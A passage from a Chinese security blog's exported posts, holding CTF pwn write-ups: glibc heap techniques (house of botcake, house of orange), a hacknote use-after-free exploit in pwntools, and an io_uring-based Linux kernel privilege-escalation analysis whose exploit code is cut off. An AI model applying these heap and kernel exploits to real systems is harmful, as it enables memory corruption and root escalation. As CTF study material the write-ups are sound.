https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d     * If the libc does not include the restriction, you can simply double free the victim and do a     * simple tcache poisoning     * And thanks to @anton00b and @subwire for the weird name of this technique */    // disable buffering so _IO_FILE does not interfere with our heap    setbuf(stdin, NULL);    setbuf(stdout, NULL);    // introduction    puts(&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;);    puts(&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;);    puts(&quot;This attack only relies on double free.\\n&quot;);    // prepare the target    intptr_t stack_var[4];    puts(&quot;The address we want malloc() to return, namely,&quot;);    printf(&quot;the target address is %p.\\n\\n&quot;, stack_var);    // prepare heap layout    puts(&quot;Preparing heap layout&quot;);    puts(&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;);    intptr_t *x[7];    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;        x[i] = malloc(0x100);    &#125;    puts(&quot;Allocating a chunk for later consolidation&quot;);    intptr_t *prev = malloc(0x100);    puts(&quot;Allocating the victim chunk.&quot;);    intptr_t *a = malloc(0x100);    printf(&quot;malloc(0x100): a=%p.\\n&quot;, a);     puts(&quot;Allocating a padding to prevent consolidation.\\n&quot;);    malloc(0x10);        // cause chunk overlapping    puts(&quot;Now we are able to cause chunk overlapping&quot;);    puts(&quot;Step 1: fill up tcache list&quot;);    for(int i=0; i&lt;7; i++)&#123;        free(x[i]);    &#125;    puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);    free(a);        puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);    free(prev);        puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n&quot;);    malloc(0x100);    /*VULNERABILITY*/    free(a);// a is already freed    /*VULNERABILITY*/        // simple tcache poisoning    puts(&quot;Launch tcache poisoning&quot;);    puts(&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;);    intptr_t *b = malloc(0x120);    puts(&quot;We simply overwrite victim&#x27;s fwd pointer&quot;);    b[0x120/8-2] = (long)stack_var;        // take target out    puts(&quot;Now we can cash out the target chunk.&quot;);    malloc(0x100);    intptr_t *c = malloc(0x100);    printf(&quot;The new chunk is at %p\\n&quot;, c);        // sanity check    assert(c==stack_var);    printf(&quot;Got control on target/stack!\\n\\n&quot;);        // note    puts(&quot;Note:&quot;);    puts(&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;);    puts(&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;);    return 0;&#125;\n\n其实很简单，也是利用了double free不过第一次free是将a丢进了unsorted bin当中，然后第二次free将a丢进了tcache，然后利用unsorted bin当中的chunk去修改tcache中的fd指针。\nhouse of orange这一攻击手法只是用于glibc2.27及一下，因为其中存在unsorted bin attack\n其实这一攻击手法也是非常简单，主要适用于程序当中不存在free的时候形成一个unsorted bin chunk然后经过unsorted bin attack进行FSOP\n因为涉及到的源码过多我这里只贴部分就行：\nif (av == NULL    || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))&#123;    char *mm;           /* return value from mmap call*/    try_mmap:\n\n首先我们肯定是不想进行mmap来新增堆空间的，所以我们不能大于他的阀值(0x2000)，其次我们如果要扩展top chunk需要绕过这几条判断：\n/* Record incoming configuration of top */old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);/*     If not the first time through, we require old_size to be     at least MINSIZE and to have prev_inuse set.   */assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;         prev_inuse (old_top) &amp;&amp;         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));/* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));\n\n可以看到存在两个assert，第一个assert我们很好绕过，只需要保留top chunk的后三位即可保留，第二个则是我们申请的size大于top chunk的size。\n因为没找到poc我就自己写了一个，其实也是很简单的，很好就可以想到：\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;    intptr_t *fp;    fp = malloc(0x10);    intptr_t *top;    top = fp + 2;    fprintf(stderr, &quot;the top chunk starts at %p;\\n&quot;, top);    fprintf(stderr, &quot;the size of top chunk is %#lx;\\n&quot;, *(top + 1));    *(top + 1) = 0xd91;    malloc(0x1000);    fprintf(stderr, &quot;Now,the top chunk is inserted the unsorted bin\\n&quot;);&#125;\n\n\n参考链接https://github.com/shellphish/how2heap\nhttps://www.anquanke.com/post/id/218887\n","categories":["pwn"],"tags":["house of 系列","house of force","house of lora","house of botcake","house of orange"]},{"title":"hacknote","url":"/2021/12/20/hacknote/","content":"检查保护\n没有开启PIE。\nvoid __cdecl __noreturn main()&#123;  int v0; // eax  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_8048956();      read(0, buf, 4u);      v0 = atoi(buf);      if ( v0 != 2 )        break;      sub_80487D4();    &#125;    if ( v0 &gt; 2 )    &#123;      if ( v0 == 3 )      &#123;        sub_80488A5();      &#125;      else      &#123;        if ( v0 == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v0 != 1 )        goto LABEL_13;      sub_8048646();    &#125;  &#125;&#125;\n\nunsigned int sub_8048646()&#123;  int v0; // ebx  int i; // [esp+Ch] [ebp-1Ch]  int size; // [esp+10h] [ebp-18h]  char buf[8]; // [esp+14h] [ebp-14h] BYREF  unsigned int v5; // [esp+1Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  if ( dword_804A04C &lt;= 5 )  &#123;    for ( i = 0; i &lt;= 4; ++i )    &#123;      if ( !*(&amp;ptr + i) )      &#123;        *(&amp;ptr + i) = malloc(8u);        if ( !*(&amp;ptr + i) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        **(&amp;ptr + i) = sub_804862B;        printf(&quot;Note size :&quot;);        read(0, buf, 8u);        size = atoi(buf);        v0 = *(&amp;ptr + i);        *(v0 + 4) = malloc(size);        if ( !*(*(&amp;ptr + i) + 1) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Content :&quot;);        read(0, *(*(&amp;ptr + i) + 1), size);        puts(&quot;Success !&quot;);        ++dword_804A04C;        return __readgsdword(0x14u) ^ v5;      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;  return __readgsdword(0x14u) ^ v5;&#125;\n\nunsigned int sub_80487D4()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )  &#123;    free(*(*(&amp;ptr + v1) + 1));    free(*(&amp;ptr + v1));    puts(&quot;Success&quot;);  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\nunsigned int sub_80488A5()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )    (**(&amp;ptr + v1))(*(&amp;ptr + v1));  return __readgsdword(0x14u) ^ v3;&#125;\n\n流程分析题目流程很简单，就是一道菜单题目，创建chunk的时候不存在堆溢出，但是释放chunk之后又没有清除指针，很明显的UAF\n利用分析首先随便创建三个chunk，然后再创建一个大小为0x8的chunk，这时候我们可以控制的chunk就是每一次自动创建的chunk，再利用sub_80488A5这个函数即可。题目很简单直接给exp\nexpfrom pwn import *elf = ELF(&#x27;./hacknote&#x27;)libc = ELF(&#x27;./libc_32.so.6&#x27;)r = process(&#x27;./hacknote&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 49789)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Note size :&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content :&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index :&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index :&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def exit():    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;4&#x27;)create(0x20, b&#x27;a&#x27;*0x20)create(0x20, b&#x27;b&#x27;*0x20)create(0x20, b&#x27;b&#x27;*0x20)delete(0)delete(1)puts_addr = 0x804862Bputs_got = elf.got[&#x27;puts&#x27;]payload = p32(puts_addr)+p32(puts_got)create(0x8, payload)show(0)puts_real_addr = u32(r.recv(4))libc_base = puts_real_addr-libc.symbols[&#x27;puts&#x27;]system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))delete(3)print(system_addr)print(bin_sh_addr)payload = p32(system_addr)+b&#x27;||sh&#x27;create(0x8, payload)# gdb.attach(r)show(0)r.interactive()\n\n解释一下为什么使用||sh而不是用bin_sh_addr，我一开始也是一直想不通。\nif ( *(&amp;ptr + v1) )  (**(&amp;ptr + v1))(*(&amp;ptr + v1));return __readgsdword(0x14u) ^ v3;\n\n我们执行的是show函数的这一句\n可以看到虽然我们构造的是sub_804862B这个函数的地址和puts的got表，但是我们下面都已经输出了我们recv的地址但是上面0x2d前面还存在其他数据，就是因为我们执行的参数并不是只是got表，是chunk的那一坨都要执行。\n所以我们最终的payload其实是执行system(note)，参数就是地址+||sh地址是肯定执行失败的所以会执行sh\n","categories":["pwn-xctf"],"tags":["UAF"]},{"title":"io_uring在kernel pwn中的优异表现","url":"/2023/04/20/io-uring/","content":"前言目前各种比赛的各种赛制真的是让人十分难受，以至于感觉自己不怎么适合打比赛了。所以打算静下心来复现一场比赛，在RCTF中找到分值最低的一道题。做的过程中越看越不对劲，还算是有难度的一道内核堆题怎么被打烂了，一搜才发现是有非预期解。但我头铁，静下心来用预期解打，索性功夫不负有心人在这道题目中发现了不得了的东西。\n目前的窘境如果存在UAF的object规定大小只能为0x10的话，各位肯定会想到使用可以实现分配任意大小object的函数。\n所以如果提到内核中可以达到任意大小的结构体时估计各位会想到setxattr、msg_msg之类的。但是这两者均具有很大的局限性，setxattr前面提到过，这个在调用完成后会kfree掉使用的object，并且在高版本的linux内核中这个函数早已被修改了。msg_msg这个结构体就更为明显了，需要用很大的空间来保存结构体中的成员。\n因为是size很小的堆块所以各位可能还会思考到一部分结构体例如:seq_operations、shm_file_data之类的。但是他们的size也是0x20。\nIO_uring网上关于io_uring对于kernel pwn的利用相对较少，特别是中文文章，我几乎没搜到，搜到的也只是对其进行介绍，并没有实际的操作之类的。所以为了写这篇文章我看了两天Linux内核的源码，眼睛都要瞎了！！！\n介绍关于IO_uring的介绍在网上其实很多。io_uring是2019年Linux 5.1内核首次引入的高性能异步I/O框架，可以显着加速I/O密集型应用程序的性能。为了减少 I/O 操作时的内存映射，该模块允许用户预先注册一些固定的 I/O 缓冲区，以便这些缓冲区可以被重用。这里推荐大家最好去看看关于他的实现。\n分析这里算是这篇文章的重点！\n分配object当我们调用io_uring_register_buffers_tags函数时：\nint io_uring_register_buffers_tags(struct io_uring *ring,\t\t\t\t   const struct iovec *iovecs,\t\t\t\t   const __u64 *tags,\t\t\t\t   unsigned nr)&#123;\tstruct io_uring_rsrc_register reg = &#123;\t\t.nr = nr,\t\t.data = (unsigned long)iovecs,\t\t.tags = (unsigned long)tags,\t&#125;;\treturn do_register(ring, IORING_REGISTER_BUFFERS2, &amp;reg, sizeof(reg));&#125;\n\n#define DIV_ROUND_UP(n,d) (((n) + (d) - 1) / (d))static __cold void **io_alloc_page_table(size_t size)&#123;\tunsigned i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);\tsize_t init_size = size;\tvoid **table;\ttable = kcalloc(nr_tables, sizeof(*table), GFP_KERNEL_ACCOUNT);\tif (!table)\t\treturn NULL;\tfor (i = 0; i &lt; nr_tables; i++) &#123;\t\tunsigned int this_size = min_t(size_t, size, PAGE_SIZE);\t\ttable[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);\t\tif (!table[i]) &#123;\t\t\tio_free_page_table(table, init_size);\t\t\treturn NULL;\t\t&#125;\t\tsize -= this_size;\t&#125;\treturn table;&#125;\n\n最终会进入上面这个函数中，其中的size是我们可以直接进行控制的，可以明显的看出来这里可以真正实现任意大小分配，并且在table[i]也就是ctx-&gt;buf_data-&gt;tags[i]中不含有任何指针或者数据之类的，在table也就是ctx-&gt;buf_data-&gt;tags中只含有后面分配的object指针。\n更新object当我们调用io_uring_register_buffers_update_tag函数时，可以对tags也就是我们上面table[i]中分配的object进行内容更新：\nint io_uring_register_buffers_update_tag(struct io_uring *ring, unsigned off,\t\t\t\t\t const struct iovec *iovecs,\t\t\t\t\t const __u64 *tags,\t\t\t\t\t unsigned nr)&#123;\tstruct io_uring_rsrc_update2 up = &#123;\t\t.offset\t= off,\t\t.data = (unsigned long)iovecs,\t\t.tags = (unsigned long)tags,\t\t.nr = nr,\t&#125;;\treturn do_register(ring, IORING_REGISTER_BUFFERS_UPDATE, &amp;up, sizeof(up));&#125;\n\n#define PAGE_SHIFT 12#define IO_RSRC_TAG_TABLE_SHIFT\t(PAGE_SHIFT - 3)static inline u64 *io_get_tag_slot(struct io_rsrc_data *data, unsigned int idx)&#123;\tunsigned int off = idx &amp; IO_RSRC_TAG_TABLE_MASK;\tunsigned int table_idx = idx &gt;&gt; IO_RSRC_TAG_TABLE_SHIFT;\treturn &amp;data-&gt;tags[table_idx][off];&#125;static int __io_sqe_buffers_update(struct io_ring_ctx *ctx,\t\t\t\t   struct io_uring_rsrc_update2 *up,\t\t\t\t   unsigned int nr_args)&#123;\tu64 __user *tags = u64_to_user_ptr(up-&gt;tags);\tstruct iovec iov, __user *iovs = u64_to_user_ptr(up-&gt;data);\tstruct page *last_hpage = NULL;\tbool needs_switch = false;\t__u32 done;\tint i, err;\tif (!ctx-&gt;buf_data)\t\treturn -ENXIO;\tif (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)\t\treturn -EINVAL;\tfor (done = 0; done &lt; nr_args; done++) &#123;\t\tstruct io_mapped_ubuf *imu;\t\tint offset = up-&gt;offset + done;\t\tu64 tag = 0;\t\terr = io_copy_iov(ctx, &amp;iov, iovs, done);\t\tif (err)\t\t\tbreak;\t\tif (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], sizeof(tag))) &#123;\t\t\terr = -EFAULT;\t\t\tbreak;\t\t&#125;\t\terr = io_buffer_validate(&amp;iov);\t\tif (err)\t\t\tbreak;\t\tif (!iov.iov_base &amp;&amp; tag) &#123;\t\t\terr = -EINVAL;\t\t\tbreak;\t\t&#125;\t\terr = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);\t\tif (err)\t\t\tbreak;\t\ti = array_index_nospec(offset, ctx-&gt;nr_user_bufs);\t\tif (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;\t\t\terr = io_queue_rsrc_removal(ctx-&gt;buf_data, i,\t\t\t\t\t\t    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);\t\t\tif (unlikely(err)) &#123;\t\t\t\tio_buffer_unmap(ctx, &amp;imu);\t\t\t\tbreak;\t\t\t&#125;\t\t\tctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;\t\t\tneeds_switch = true;\t\t&#125;\t\tctx-&gt;user_bufs[i] = imu;\t\t*io_get_tag_slot(ctx-&gt;buf_data, offset) = tag;\t&#125;\tif (needs_switch)\t\tio_rsrc_node_switch(ctx, ctx-&gt;buf_data);\treturn done ? done : err;&#125;\n\n可以看到他这里更新方式也很独树一帜，并不是简单的copy_from_user之类的，而是八个字节八个字节的写。\n释放object调用io_uring_unregister_buffers函数即可对所有object进行释放：\nint io_uring_unregister_buffers(struct io_uring *ring)&#123;\treturn do_register(ring, IORING_UNREGISTER_BUFFERS, NULL, 0);&#125;\n\nstatic void io_free_page_table(void **table, size_t size)&#123;\tunsigned i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);\tfor (i = 0; i &lt; nr_tables; i++)\t\tkfree(table[i]);\tkfree(table);&#125;\n\n最终调用到的是上面这个函数中，其中table的含义跟分配时一致。\n总结通过上面三个方向的分析，各位大佬应该能想到IO_uring在很多方面都可以进行利用，不过他的缺点也很明显，他无法读取堆块上的内容(可能是我没找到，找到的佬可以留言一下)。\nRCTF2022 game现在开始题目分析，出题人师傅是给了源代码的，但是通过ida逆向并不困难，所以下面还是给ida中的代码\n驱动分析void __fastcall hhoge_unlocked_ioctl(__int64 a1, unsigned int a2, __int64 a3)&#123;  __int64 v3; // rbx  __int64 v4; // rbp  __int64 v5; // r12  __int64 v6; // r13  __int64 v7; // r14  __int64 v8; // r15  __int64 v9; // rdx  Maind *maind_chunk; // r13  __int64 new_chunk; // rax  char *username; // rdi  __int64 v13; // rcx  _DWORD *v14; // rsi  _QWORD v15[5]; // [rsp-58h] [rbp-58h] BYREF  __int64 v16; // [rsp-30h] [rbp-30h]  __int64 v17; // [rsp-28h] [rbp-28h]  __int64 v18; // [rsp-20h] [rbp-20h]  __int64 v19; // [rsp-18h] [rbp-18h]  __int64 v20; // [rsp-10h] [rbp-10h]  __int64 v21; // [rsp-8h] [rbp-8h]  _fentry__();  v21 = v4;  v20 = v8;  v19 = v7;  v18 = v6;  v17 = v5;  v16 = v3;  maind_chunk = *(Maind **)(a1 + 0xC8);  v15[4] = __readgsqword(0x28u);  if ( maind_chunk )  &#123;    copy_from_user(v15, v9, 0x20LL);    if ( a2 == 0x72 )    &#123;      change(maind_chunk, v15);    &#125;    else if ( a2 &lt;= 0x72 )    &#123;      if ( a2 == 0x16 )      &#123;        hhoge_unlocked_ioctl_cold();      &#125;      else if ( a2 &lt;= 0x16 )      &#123;        if ( a2 )        &#123;          if ( a2 == 1 )            reborn_0(maind_chunk);        &#125;        else        &#123;          printk(&quot;born&quot;);          new_chunk = kmem_cache_alloc_trace(kmalloc_caches[5], 0xDC0LL, 0x18LL);          username = maind_chunk-&gt;username;          v13 = 8LL;          v14 = v15;          maind_chunk-&gt;cur = (void *)new_chunk;          *(_QWORD *)(new_chunk + 8) = &quot;ordinary&quot;;          maind_chunk-&gt;id = 0LL;          while ( v13 )          &#123;            *(_DWORD *)username = *v14++;            username += 4;            --v13;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n在ioctl中分为了四类。\nvoid __fastcall reborn_0(Maind *context)&#123;  void *v2; // rax  _DWORD *cur; // rdx  __int64 v4; // rcx  _DWORD *v5; // rdi  _DWORD *v6; // rsi  _fentry__();  printk(&quot;reborn&quot;);  v2 = (void *)kmem_cache_alloc_trace(kmalloc_caches[5], 0xDC0LL, 0x18LL);  cur = context-&gt;cur;  v4 = 6LL;  context-&gt;prv = v2;  v5 = v2;  v6 = cur;  while ( v4 )  &#123;    *v5++ = *v6++;    --v4;  &#125;  *((_QWORD *)cur + 1) = &quot;unlucky&quot;;  *((_QWORD *)context-&gt;cur + 2) = 0xFFFFFFFFFFFE40AELL;  ++context-&gt;id;&#125;\n\n其中的reborn_0函数并没有将新分配的object给到cur指针中，而是给到了context-&gt;prv中去了。并且会把context-&gt;cur[0]的内容复制到context-&gt;prv[0]中去。\nvoid __fastcall change_cold(Maind *a1)&#123;  __int64 v1; // rbp  __int64 v2; // r12  char *v4; // rax  const char *v5; // r14  char *v6; // rax  unsigned __int64 v7; // kr08_8  _QWORD *cur; // r13  __int64 v9; // r15  const char *v10; // rdi  int v11; // eax  int v12; // edx  printk(&quot;change&quot;);  while ( 1 )  &#123;    do    &#123;      v4 = strsep((char **)(v1 - 0x38), &quot;,&quot;);      v5 = v4;      if ( !v4 )LABEL_24:        JUMPOUT(0x132LL);    &#125;    while ( !*v4 );    v6 = strchr(v4, 0x3D);    if ( !v6 )      break;    if ( v5 != v6 )    &#123;      *v6 = 0;      v7 = strlen(v6 + 1) + 1;      if ( v7 - 1 &lt;= 9 )      &#123;        cur = a1-&gt;cur;        if ( !cur )          goto LABEL_24;        if ( v6 != (char *)-1LL )        &#123;          v2 = kmemdup_nul(v6 + 1, v7 - 1, 0xCC0LL);          if ( !v2 )            goto LABEL_24;        &#125;LABEL_10:        v9 = 0LL;        do        &#123;          v10 = key_list[v9];          if ( !v10 )            goto LABEL_18;          *(_DWORD *)(v1 - 0x3C) = v9++;          v11 = strcmp(v10, v5);          v12 = *(_DWORD *)(v1 - 0x3C);        &#125;        while ( v11 );        if ( v12 == 2 )        &#123;          cur[2] += v2;        &#125;        else if ( v12 &lt;= 2 )        &#123;          if ( v12 )          &#123;            if ( v12 == 1 )              cur[1] = &quot;lucky&quot;;          &#125;          else          &#123;            kfree(*cur);            *cur = v2;            v2 = 0LL;          &#125;        &#125;LABEL_18:        kfree(v2);      &#125;    &#125;  &#125;  cur = a1-&gt;cur;  if ( !cur )    goto LABEL_24;  goto LABEL_10;&#125;\n\n然后就是change函数，这道题唯一难逆向的地方就在这里，仔细看其实也挺简单的，就是进行字符串对比然后进入相应的分值，其中kmemdup_nul函数会分配一个堆块，所以这里就是首先kfree掉当前context-&gt;cur[0]然后将新分配的堆块放进去。\nvoid __fastcall delMaind_0(Maind *context)&#123;  _QWORD *cur; // r14  _QWORD *prv; // r13  _fentry__();  printk(&quot;die\\n&quot;);  cur = context-&gt;cur;  prv = context-&gt;prv;  if ( cur )  &#123;    kfree(*cur);    *cur = 0LL;    kfree(cur);    context-&gt;cur = 0LL;  &#125;  if ( prv )  &#123;    kfree(*prv);    *prv = 0LL;    kfree(prv);    context-&gt;prv = 0LL;  &#125;  kfree(context);&#125;\n\n这个函数其实也就是hhoge_unlocked_ioctl_cold，可以看到这里会kfree掉的东西很多。\nssize_t __fastcall hhoge_read(file *file, char *ubuf, size_t size, loff_t *ppos)&#123;  unsigned __int64 v4; // rdx  Maind *private_data; // rax  void *v6; // r14  __int64 v7; // r12  _fentry__();  private_data = (Maind *)file-&gt;private_data;  if ( !private_data )    return 0LL;  v6 = private_data-&gt;cur;  if ( v6 )  &#123;    v7 = 9LL;    if ( v4 &lt;= 9 )      v7 = v4;    _check_object_size(private_data-&gt;cur, v7, 1LL);    copy_to_user(ubuf, v6, v7);  &#125;  return 0LL;&#125;\n\n最后就是read函数，最多只允许读取9个字节的内容。可以很容易的看出来，这里可以直接读取到堆地址。\n题目的漏洞很明显，如果我们使用change_cold函数分配一个堆块，那么此时这个堆块的地址在context-&gt;cur[0]中随后调用reborn_0函数，那么堆块地址在context-&gt;prv[0]中也存在了，那么如果我们再次调用change_cold函数的话，就会kfree调用context-&gt;cur[0]中的堆块，但是此时context-&gt;prv[0]指针仍然保存着目标堆块的地址，此时就形成了UAF。\n利用分析知道了io_uring以及上面的漏洞的话利用方式就很明显了，这里可以首先利用io_uring可以随意更新内容的机制以及read可以泄漏出堆地址配合modify_ldt实现任意地址读，在堆区中寻在task_struct结构体，进而获得cred地址。这里需要注意的是在新版本task_struct在这一片区域有一点小变化：\n\t/* Objective and real subjective task credentials (COW): */\tconst struct cred __rcu\t\t*real_cred;\t/* Effective (overridable) subjective task credentials (COW): */\tconst struct cred __rcu\t\t*cred;#ifdef CONFIG_KEYS\t/* Cached requested key. */\tstruct key\t\t\t*cached_requested_key;#endif\t/*\t * executable name, excluding path.\t *\t * - normally initialized setup_new_exec()\t * - access it with [gs]et_task_comm()\t * - lock it with task_lock()\t */\tchar\t\t\t\tcomm[TASK_COMM_LEN];\n\ncomm和cred中间新增了一个指针。\n随后释放掉ldt结构体，让ctx-&gt;buf_data-&gt;tag也就是上面的table分配的大小为0x10，使table占据这个UAF的堆块。那我们可以通过ring0的ctx-&gt;buf_data-&gt;tag[0]也就是table[0]去修改ring1的ctx-&gt;buf_data-&gt;tags为cred地址，如果我们此时修改ring1的ctx-&gt;buf_data-&gt;tag[0]就可以修改到cred结构体了，完成了提权。\n不熟悉上述提到的提权方式可以看一下这篇文章 kernel pwn内存任意读写提升权限[1]\n不熟悉modify_ldt的可以看一下这篇文章 modify_ldt利用\n综上可得exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;liburing.h&gt;struct io_uring ring, ring1, ring2;struct ldt_struct&#123;    size_t entries;    unsigned int nr_entries;    int slot;&#125;;void init_uring()&#123;    io_uring_queue_init(2, &amp;ring, 0);    io_uring_queue_init(2, &amp;ring1, 0);&#125;void register_tag(struct io_uring *ring, size_t *data, int num)&#123;    char tmp_buf[0x2000];    struct iovec vecs[num];    size_t tags[num];    memcpy(tags, data, num * sizeof(size_t));    for (int i = 0; i &lt; num; i++)    &#123;        vecs[i].iov_base = tmp_buf;        vecs[i].iov_len = 1;    &#125;    int res = io_uring_register_buffers_tags(ring, vecs, tags, num);    if (res &lt; 0)    &#123;        errExit(sprintf(&quot;io_uring_register_buffers_tags %d\\n&quot;, res));    &#125;&#125;void update_tag(struct io_uring *ring, size_t Data, int num)&#123;    char tmp_buf[1024];    struct iovec vecs[2];    vecs[0].iov_base = tmp_buf;    vecs[0].iov_len = 1;    vecs[1].iov_base = tmp_buf;    vecs[1].iov_len = 1;    int ret = io_uring_register_buffers_update_tag(ring, 0, vecs, Data, num);    if (ret &lt; 0)    &#123;        errExit(sprintf(&quot;io_uring_register_buffers_update_tag %d\\n&quot;, ret));    &#125;&#125;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;struct user_desc&#123;    unsigned int entry_number;    unsigned int base_addr;    unsigned int limit;    unsigned int seg_32bit : 1;    unsigned int contents : 2;    unsigned int read_exec_only : 1;    unsigned int limit_in_pages : 1;    unsigned int seg_not_present : 1;    unsigned int useable : 1;    unsigned int lm : 1;&#125;;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int fd;int main()&#123;    signal(SIGSEGV, get_shell);    signal(SIGINT, get_shell);    char *buf = malloc(0x4000);    int pipe_fd[2] = &#123;0&#125;;    unsigned long *info = malloc(0x2000);    uint64_t search_addr;    uint64_t vmlinux_base = 0xffffffff81000000;    char target[16];    char *result;    uint64_t cred = -1;    size_t real_cred = -1;    int root_cred[12];    size_t target_addr;    memset(info, 0, sizeof(info));    strcpy(target, &quot;trytofind196082&quot;);    if (prctl(PR_SET_NAME, target, 0, 0, 0) != 0)    &#123;        errExit(&quot;cannot set name&quot;);    &#125;    fd = open(&quot;/dev/game&quot;, 0);    if (fd &lt; 0)    &#123;        errExit(&quot;failed open /dev/game&quot;);    &#125;    puts(&quot;\\033[34m\\033[1m[*] construct double free! \\033[0m&quot;);    init_uring();    